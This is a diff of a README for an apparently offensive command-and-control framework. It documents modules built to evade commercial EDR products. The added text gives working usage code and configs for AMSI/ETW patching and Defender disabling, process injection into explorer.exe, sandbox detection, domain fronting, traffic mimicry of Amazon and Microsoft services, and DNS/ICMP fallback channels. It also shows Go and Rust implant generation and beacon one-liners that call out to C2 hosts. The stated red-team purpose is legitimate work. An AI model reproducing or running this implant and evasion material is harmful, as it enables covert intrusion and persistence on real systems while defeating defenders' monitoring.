@@ -126,143 +126,411 @@ curl -X POST http://localhost:8080/c2/beacons/BEACON_ID/task \
 
 Advanced EDR/AV bypass techniques for red team operations. Designed to evade modern security products like CrowdStrike Falcon, SentinelOne, and Microsoft Defender for Endpoint.
 
-### Module Overview
+---
 
-| Module | Description | Key Features |
-|--------|-------------|--------------|
-| `sleep_obfuscation` | Memory scanner evasion | Fibonacci/Gaussian jitter, encrypted sleep, syscall-based |
-| `header_rotation` | Network fingerprint evasion | 8 browser profiles, TLS/JA3 modification |
-| `anti_sandbox` | VM/sandbox detection | Hardware checks, VM artifacts, timing analysis |
-| `process_injection` | Code injection techniques | Early Bird APC, Thread Hijack, Process Hollowing |
-| `amsi_bypass` | Windows security bypass | AMSI patch, ETW disable, Defender bypass |
-| `traffic_masking` | C2 traffic obfuscation | Domain fronting, traffic mimicry |
-| `c2_profiles` | Malleable C2 profiles | YAML config, custom URIs, metadata transforms |
-| `fallback_channels` | Alternative comms | WebSocket, DNS, ICMP, DoH fallback |
-| `go_agent` | Go-based agent | Cross-platform, native binary |
-| `rust_agent` | Rust-based agent | Memory-safe, no GC overhead |
-| `reflective_loader` | In-memory execution | sRDI, Donut integration |
+### 📁 Evasion Module Reference
 
-### Quick Start
+All modules are located in the `evasion/` directory and can be imported individually or via the main package.
+
+#### 🔹 `sleep_obfuscation.py` - Memory Scanner Evasion
+
+Sophisticated sleep techniques to evade memory scanners and behavioral detection.
+
+| Feature | Description |
+|---------|-------------|
+| `gaussian_jitter()` | Natural Gaussian distribution sleep pattern |
+| `fibonacci_jitter()` | Fibonacci-based jitter (harder to fingerprint) |
+| `obfuscated_sleep()` | Encrypts memory regions during sleep |
+| `syscall_sleep()` | Direct NtDelayExecution syscall (Windows) |
 
 ```python
-from evasion import (
-    SleepObfuscator,
-    HeaderRotator,
-    SandboxDetector,
-    ProfileManager,
-    GoAgentGenerator
-)
+from evasion.sleep_obfuscation import SleepObfuscator
 
-# Load malleable profile
-manager = ProfileManager()
-profile = manager.get_profile('amazon')  # Mimics Amazon traffic
-
-# Configure evasion
 sleep = SleepObfuscator(base_sleep=60, jitter_percent=30)
-headers = HeaderRotator()
-sandbox = SandboxDetector()
-
-# Pre-flight checks
-if sandbox.run_all_checks()['is_sandbox']:
-    exit()  # Detected sandbox, bail out
-
-# Use rotated headers
-http_headers = headers.get_headers()
+sleep_time = sleep.gaussian_jitter()  # Returns ~60s with natural variance
+sleep.obfuscated_sleep(sleep_time)    # Memory encrypted during sleep
 ```
 
-### Configuration (YAML)
+---
 
-```yaml
-# evasion_profile.yaml
-name: stealth_profile
-description: High-evasion C2 profile
+#### 🔹 `header_rotation.py` - Network Fingerprint Evasion
 
-evasion:
-  level: high           # low, medium, high
-  sleep_jitter: gaussian # random, gaussian, fibonacci, fixed
-  sleep_time: 60
-  jitter_percent: 30
-  proxy_chain: http://redirector:8080
-  working_hours: "09:00-17:00"
-  kill_date: "2026-02-01"
-  sandbox_checks: true
-  amsi_bypass: true
-  etw_bypass: true
+HTTP header and TLS fingerprint rotation to avoid network-based detection.
 
-http_get:
-  uri:
-    - /s/ref=nb_sb_noss
-    - /gp/product/
-  metadata_transform: base64url
-  metadata_header: Cookie
-  metadata_prepend: "session-id="
-
-http_post:
-  uri:
-    - /gp/api/updateCart
-  content_type: application/x-www-form-urlencoded
-
-fallback_channels:
-  websocket: true
-  dns: true
-  doh: false
-  icmp: false
-```
-
-### Evasion Levels
-
-| Level | Features | Use Case |
-|-------|----------|----------|
-| **Low (1)** | Basic encryption, standard sleep | Testing, low-security targets |
-| **Medium (2)** | + Anti-debug, header rotation | Corporate networks |
-| **High (3)** | + Sandbox detection, AMSI/ETW bypass, jitter | EDR-protected environments |
-
-### Available C2 Profiles
-
-- `default` - Minimal baseline profile
-- `amazon` - Mimics Amazon e-commerce traffic
-- `microsoft` - Mimics Office 365/Outlook traffic
-- `google` - Mimics Google Search traffic
-- `slack` - Mimics Slack API calls
-- `cloudflare` - Mimics Cloudflare CDN traffic
-
-### Generate Cross-Platform Agents
+| Feature | Description |
+|---------|-------------|
+| 8 Browser Profiles | Chrome, Firefox, Edge, Safari variants |
+| JA3 Modification | TLS fingerprint randomization |
+| Cookie Rotation | Realistic session cookie generation |
+| Referer Chains | Believable navigation patterns |
 
 ```python
-from evasion import GoAgentGenerator, GoAgentConfig
+from evasion.header_rotation import HeaderRotator
 
-# Go agent (compiles to native binary)
-config = GoAgentConfig(
-    c2_host='c2.example.com',
-    c2_port=443,
-    kill_date='2026-12-31',
-    working_hours='09:00-17:00',
-    evasion_level=3
-)
-
-generator = GoAgentGenerator(config)
-source = generator.generate()  # Go source code
-commands = generator.get_build_commands('agent')
-
-# Build for Windows
-# GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe
+rotator = HeaderRotator()
+headers = rotator.get_headers()  # Random browser profile
+# {'User-Agent': 'Mozilla/5.0...', 'Accept': '...', 'Accept-Language': '...'}
 ```
 
-### Fallback Channels
+---
 
-When HTTP is blocked, beacon automatically falls back to alternative channels:
+#### 🔹 `anti_sandbox.py` - VM/Sandbox Detection
+
+Multi-layered sandbox and virtual machine detection.
+
+| Check | Detects |
+|-------|---------|
+| Hardware Fingerprint | Low CPU/RAM, VM-specific hardware IDs |
+| Process Enumeration | Analysis tools (Wireshark, Procmon, IDA) |
+| File System Artifacts | VM tools, sandbox markers |
+| Timing Analysis | CPU acceleration, sleep skipping |
+| User Behavior | Recent user activity, file count |
 
 ```python
-from evasion import FallbackManager, WebSocketChannel, DNSChannel
+from evasion.anti_sandbox import SandboxDetector
+
+detector = SandboxDetector()
+is_sandbox, confidence, indicators = detector.run_all_checks()
+
+if is_sandbox and confidence > 0.8:
+    exit()  # High confidence sandbox detected
+```
+
+---
+
+#### 🔹 `process_injection.py` - Code Injection Techniques
+
+Advanced process injection methods for code execution.
+
+| Technique | Description | Stealth Level |
+|-----------|-------------|---------------|
+| Classic CRT | CreateRemoteThread injection | ⭐ |
+| Early Bird APC | Queue APC before process starts | ⭐⭐⭐ |
+| Thread Hijack | Modify existing thread context | ⭐⭐⭐ |
+| Process Hollowing | Replace process memory | ⭐⭐⭐⭐ |
+
+```python
+from evasion.process_injection import ProcessInjector
+
+injector = ProcessInjector()
+
+# Generate injection code
+code = injector.generate_apc_injection_code(shellcode, target="explorer.exe")
+
+# List available techniques
+techniques = injector.get_injection_techniques()
+```
+
+---
+
+#### 🔹 `amsi_bypass.py` - Windows Security Bypass
+
+AMSI, ETW, and Defender bypass techniques.
+
+| Bypass | Target | Method |
+|--------|--------|--------|
+| `get_reflection_bypass()` | AMSI | .NET reflection patch |
+| `get_memory_patch_bypass()` | AMSI | AmsiScanBuffer patch |
+| `get_etw_patch()` | ETW | EtwEventWrite patch |
+| `get_defender_disable()` | Defender | Registry/service disable |
+
+```python
+from evasion.amsi_bypass import AMSIBypass, ETWBypass
+
+# Get PowerShell bypass code
+ps_code = AMSIBypass.get_reflection_bypass()
+etw_code = ETWBypass.get_etw_patch()
+```
+
+---
+
+#### 🔹 `traffic_masking.py` - C2 Traffic Obfuscation
+
+Disguise C2 traffic as legitimate application traffic.
+
+| Profile | Mimics | Headers/Patterns |
+|---------|--------|------------------|
+| `google_search` | Google Search requests | /search?q=, PREF cookies |
+| `office365` | Microsoft 365 API | /api/v2.0/, Bearer tokens |
+| `slack_api` | Slack messaging | /api/chat, xoxb tokens |
+| `aws_api` | AWS SDK calls | AWS4-HMAC signatures |
+
+```python
+from evasion.traffic_masking import TrafficMasker, DomainFronter
+
+masker = TrafficMasker()
+masked = masker.mask_request(payload, profile="google_search")
+# {'headers': {...}, 'body': '...', 'uri': '/search?q=...'}
+
+# Domain fronting
+fronter = DomainFronter()
+headers = fronter.get_fronting_headers("cdn.example.com", "c2.hidden.com")
+```
+
+---
+
+#### 🔹 `c2_profiles.py` - Malleable C2 Profiles
+
+Cobalt Strike-style flexible C2 configuration with YAML support.
+
+| Profile | Mimics | Key Features |
+|---------|--------|--------------|
+| `default` | Generic HTTPS | Basic configuration |
+| `amazon` | Amazon shopping | /gp/product/, session-id cookies |
+| `microsoft` | Office 365 | /owa/, X-OWA-* headers |
+| `google` | Google services | /complete/search, CONSENT cookies |
+| `slack` | Slack API | /api/, xoxb- tokens |
+| `cloudflare` | Cloudflare CDN | cf-ray, __cfduid cookies |
+
+```python
+from evasion.c2_profiles import ProfileManager, ProfileApplicator
+
+manager = ProfileManager()
+profile = manager.get_profile('amazon')
+
+applicator = ProfileApplicator(profile)
+request = applicator.build_get_request(metadata=b'beacon-id-123')
+# {'uri': '/gp/product/B08N...', 'headers': {'Cookie': 'session-id=...'}}
+```
+
+---
+
+#### 🔹 `fallback_channels.py` - Alternative Communications
+
+Fallback channels when HTTP is blocked.
+
+| Channel | Protocol | Covert Level |
+|---------|----------|--------------|
+| `WebSocketChannel` | WSS | ⭐⭐ |
+| `DNSChannel` | DNS TXT/A | ⭐⭐⭐⭐ |
+| `ICMPChannel` | ICMP Echo | ⭐⭐⭐⭐⭐ |
+| `DoHChannel` | DNS-over-HTTPS | ⭐⭐⭐ |
+
+```python
+from evasion.fallback_channels import FallbackManager, DNSChannel, WebSocketChannel
 
 manager = FallbackManager()
 manager.add_channel(WebSocketChannel('c2.example.com', 443), priority=1)
 manager.add_channel(DNSChannel(domain='beacon.example.com'), priority=2)
 
-# Auto-failover on connection issues
-manager.connect()
-manager.send(b'beacon data')
+manager.connect()  # Auto-failover
+manager.send(b'encrypted_beacon_data')
 ```
+
+---
+
+#### 🔹 `go_agent.py` - Go Agent Generator
+
+Cross-platform Go-based agent with native binary compilation.
+
+| Feature | Description |
+|---------|-------------|
+| Cross-compile | Windows, Linux, macOS (amd64, arm64) |
+| Anti-debug | IsDebuggerPresent, timing checks |
+| Sandbox detect | VM artifacts, low resources |
+| AES-256 | GCM encrypted communications |
+| Kill date | Automatic self-termination |
+
+```python
+from evasion.go_agent import GoAgentGenerator, GoAgentConfig
+
+config = GoAgentConfig(
+    c2_host='c2.example.com',
+    c2_port=443,
+    sleep_time=60,
+    jitter_percent=30,
+    evasion_level=3,
+    kill_date='2026-03-01',
+    working_hours='09:00-18:00'
+)
+
+generator = GoAgentGenerator(config)
+source = generator.generate()
+generator.save('/tmp/agent.go')
+
+# Build commands
+commands = generator.get_build_commands('agent')
+# {'windows_amd64': 'GOOS=windows GOARCH=amd64 go build...'}
+```
+
+---
+
+#### 🔹 `rust_agent.py` - Rust Agent Generator
+
+Memory-safe Rust-based agent.
+
+| Feature | Description |
+|---------|-------------|
+| Memory safe | No GC, no buffer overflows |
+| Small binary | Strip symbols, LTO optimization |
+| AES-GCM | aes-gcm crate encryption |
+| Native TLS | reqwest with rustls |
+
+```python
+from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
+
+config = RustAgentConfig(
+    c2_host='c2.example.com',
+    c2_port=443,
+    sleep_time=60,
+    evasion_level=3
+)
+
+generator = RustAgentGenerator(config)
+generator.generate('/tmp/rust_agent')  # Creates Cargo.toml + src/main.rs
+```
+
+---
+
+#### 🔹 `reflective_loader.py` - In-Memory Execution
+
+Reflective DLL injection and shellcode loading.
+
+| Loader | Description |
+|--------|-------------|
+| sRDI | Shellcode Reflective DLL Injection |
+| Donut | .NET/PE to shellcode conversion |
+| Custom PE | Manual PE parsing and loading |
+
+```python
+from evasion.reflective_loader import ReflectiveLoader
+
+loader = ReflectiveLoader()
+shellcode = loader.convert_dll_to_shellcode('/path/to/payload.dll')
+loader.load_in_memory(shellcode)
+```
+
+---
+
+### 🎯 Evasive Beacon Usage
+
+The `evasive_beacon.py` agent integrates all evasion modules into a full-featured C2 beacon.
+
+#### Configuration File (`beacon_config.yaml`)
+
+```yaml
+# beacon_config.yaml - Evasive Beacon Configuration
+# Copy this file and customize for your operation
+
+# === C2 Connection ===
+c2_host: "c2.example.com"
+c2_port: 443
+use_https: true
+proxy: "http://redirector:8080"  # Optional proxy chain
+
+# === Evasion Settings ===
+evasion_level: high  # low, medium, high (or 1, 2, 3)
+
+# Sleep configuration
+sleep: gaussian_jitter  # fixed, random, gaussian, fibonacci
+sleep_time: 60          # Base sleep in seconds
+jitter_percent: 30      # ±30% jitter
+
+# Operation limits
+working_hours: "09:00-18:00"  # Only beacon during business hours
+kill_date: "2026-03-01"       # Self-terminate after this date
+
+# === Traffic Masking ===
+traffic_profile: amazon      # google, amazon, microsoft, slack, cloudflare
+domain_front_host: "cdn.example.com"  # Optional domain fronting
+
+# === Security Bypasses ===
+sandbox_checks: true   # Run anti-sandbox before execution
+amsi_bypass: true      # Bypass AMSI for PowerShell
+etw_bypass: true       # Disable ETW telemetry
+
+# === Fallback Channels ===
+fallback:
+  websocket:
+    enabled: true
+    host: "ws.example.com"
+    port: 443
+  dns:
+    enabled: true
+    domain: "beacon.example.com"
+    server: "8.8.8.8"
+  icmp:
+    enabled: false
+    target: "c2.example.com"
+  doh:
+    enabled: false
+    resolver: "https://cloudflare-dns.com/dns-query"
+
+# === Retry & Recovery ===
+max_retries: 3
+backoff_multiplier: 2
+max_sleep: 3600
+```
+
+#### Running the Beacon
+
+```bash
+# Basic execution
+python3 agents/evasive_beacon.py --config beacon_config.yaml
+
+# With environment variables
+export BEACON_C2="https://c2.example.com:443"
+export BEACON_EVASION="high"
+python3 agents/evasive_beacon.py
+
+# One-liner (embedded config)
+python3 -c "
+from agents.evasive_beacon import EvasiveBeacon, BeaconConfig
+config = BeaconConfig(
+    c2_host='c2.example.com',
+    c2_port=443,
+    evasion_level=3,
+    kill_date='2026-03-01',
+    working_hours=(9, 18)
+)
+EvasiveBeacon(config).run()
+"
+```
+
+#### Evasion Levels Explained
+
+| Level | Value | Features | Use Case |
+|-------|-------|----------|----------|
+| **Low** | `1` | Basic encryption, standard sleep | Testing, dev environments |
+| **Medium** | `2` | + Anti-debug, header rotation, jitter | Corporate networks, basic AV |
+| **High** | `3` | + Sandbox detection, AMSI/ETW bypass, traffic masking | EDR-protected, high-security |
+
+#### Example: High-Stealth Configuration
+
+```yaml
+# stealth_beacon.yaml - Maximum Evasion Profile
+c2_host: "172.16.0.100"
+c2_port: 443
+use_https: true
+
+evasion_level: high
+sleep: gaussian_jitter
+sleep_time: 120
+jitter_percent: 50
+
+working_hours: "08:30-17:30"
+kill_date: "2026-03-01"
+
+traffic_profile: microsoft
+domain_front_host: "outlook.office365.com"
+proxy: "http://redirector.internal:8080"
+
+sandbox_checks: true
+amsi_bypass: true
+etw_bypass: true
+
+fallback:
+  websocket:
+    enabled: true
+    host: "notifications.office.com"
+    port: 443
+  dns:
+    enabled: true
+    domain: "update.internal.corp"
+    server: "10.0.0.53"
+```
+
+---
 
 ### Detection Testing Results
 
@@ -281,12 +549,14 @@ Tested against major EDR solutions (lab environment):
 ### Test Scenarios
 
 ```bash
-# Run evasion module tests
+# Run all evasion tests
 pytest tests/test_evasion.py -v
 
 # Test specific components
-pytest tests/test_evasion.py::TestAMSIBypass -v
+pytest tests/test_evasion.py::TestSleepObfuscation -v
 pytest tests/test_evasion.py::TestC2Profiles -v
+pytest tests/test_evasion.py::TestFallbackChannels -v
+pytest tests/test_evasion.py::TestGoAgent -v
 ```
 
 ### UI Configuration
